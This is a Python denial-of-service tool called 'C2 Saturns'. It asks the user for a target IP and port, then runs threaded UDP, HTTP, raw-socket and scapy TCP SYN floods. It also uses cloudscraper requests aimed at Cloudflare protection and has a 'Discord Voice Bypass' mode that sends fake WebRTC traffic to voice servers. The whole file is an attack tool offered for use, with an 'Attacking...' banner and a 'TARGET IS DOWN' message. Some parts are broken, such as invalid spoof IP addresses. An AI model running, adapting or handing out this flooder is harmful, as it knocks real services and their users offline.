import socket, threading, random, os, colorama, cloudscraper, requests, time, base64
from scapy.all import *
from colorama import Fore

fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
global ua
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')

logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              C2 Saturns
                   V1
              MADE BY : BL3Z/PS7 hit again
"""
print(Fore.LIGHTMAGENTA_EX + logo)
try:
    category = input(f"\033[1;37mSelect Attack Category (1: Normal DDoS, 2: Discord Voice Bypass): ")
    ip = input(f"\033[1;37mIP Target : ")
    port = int(input("Port : "))
    bytes = int(input("Bytes Per Sec : "))
    thrs = int(input("Thread : "))
    bost = input("Use Boost ? Y/N : ")
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')
    if bost.lower() == 'y':
        bytes = bytes + 500
    print(Fore.LIGHTMAGENTA_EX + logo)
    print(Fore.LIGHTRED_EX+"Attacking...")
    print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ BPS   : {bytes}")
    print(f"║ Thrds : {thrs} ")
    print(f"║ Boost : {bost} ")
    print(f"║ Bot   : {bytes} ")
    print(f"║ Mode  : {'Normal DDoS' if category == '1' else 'Discord Voice Bypass'} ")
    print("╚═════════════════")

    def webrtc_bypass(ip, port, fk, ua_choice):
        """Simulate WebRTC traffic to bypass Cloudflare for Discord voice servers."""
        webrtc_headers = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {fk}\r\n"
            f"User-Agent: {ua_choice}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode('utf-8')}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Upgrade: websocket\r\n"
            f"X-Discord-Client: discord-webrtc\r\n"
            f"\r\n"
        ).encode('utf-8')
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(webrtc_headers, (ip, port))
            s.sendto(os.urandom(65000), (ip, port))
        except:
            pass

    def c2():
        for fk in fake:
            try:
                # UDP Flood
                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                byte = random._urandom(60000)
                sent = 5000
                s1.sendto(byte, (ip,port))
                for i in range(bytes):
                    s1.sendto(byte, (ip,port))
                    s1.sendto(byte, (ip,port))
                    if category == '2':
                        time.sleep(random.uniform(0.01, 0.1))  # Random delay for Discord bypass
                # HTTP Flood
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.connect((ip,port))
                s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"))
                s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"))
                s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n").encode("utf-8"))
                s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
                s2.send(byte)
                # TLS Flood
                s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
                s3.connect((ip,port))
                s3.send((byte))
                # TCP SYN Flood
                fuck = IP(dst=ip)
                tcp = TCP(sport=RandShort(), dport=port, flags="S")
                raw = Raw(b"X"*60000)
                p = fuck / tcp / raw
                send(p, loop=bytes, verbose=0)
                # Cloudscraper Request
                scraper = cloudscraper.create_scraper()
                scraper.get(ip, timeout=thrs)
                # Discord Bypass
                if category == '2':
                    webrtc_bypass(ip, port, fk, random.choice(ua))
                    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                    scraper.get(ip, timeout=thrs, headers={'Host': fk, 'User-Agent': random.choice(ua)})
            except socket.gaierror:
                print(Fore.LIGHTRED_EX+"[!] Fail get target info, did you type the target correct? [!]")
                exit()
            except TimeoutError:
                print("\n")
                print(Fore.LIGHTRED_EX+"TARGET IS DOWN ! ")
            except:
                print(Fore.LIGHTMAGENTA_EX+"[ C2 ] INFO : SUCCESSFULLY FLOODING TARGET <3 [ C2 ]")
                # Repeat original attack logic for consistency
                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                byte = random._urandom(60000)
                sent = 5000
                s1.sendto(byte, (ip,port))
                for i in range(bytes):
                    s1.sendto(byte, (ip,port))
                    s1.sendto(byte, (ip,port))
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.connect((ip,port))
                s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"))
                s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"))
                s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n").encode("utf-8"))
                s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
                s2.send(byte)
                s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
                s3.connect((ip,port))
                s3.send((byte))
                fuck = IP(dst=ip)
                tcp = TCP(sport=RandShort(), dport=port, flags="S")
                raw = Raw(b"X"*60000)
                p = fuck / tcp / raw
                send(p, loop=bytes, verbose=0)
                scraper = cloudscraper.create_scraper()
                scraper.get(ip, timeout=thrs)
    for i in range(thrs):
        threads = threading.Thread(target=c2)
        threads.start()
except ValueError:
    print("\033[1;33mDid you fill the target info correctly? please retry!")
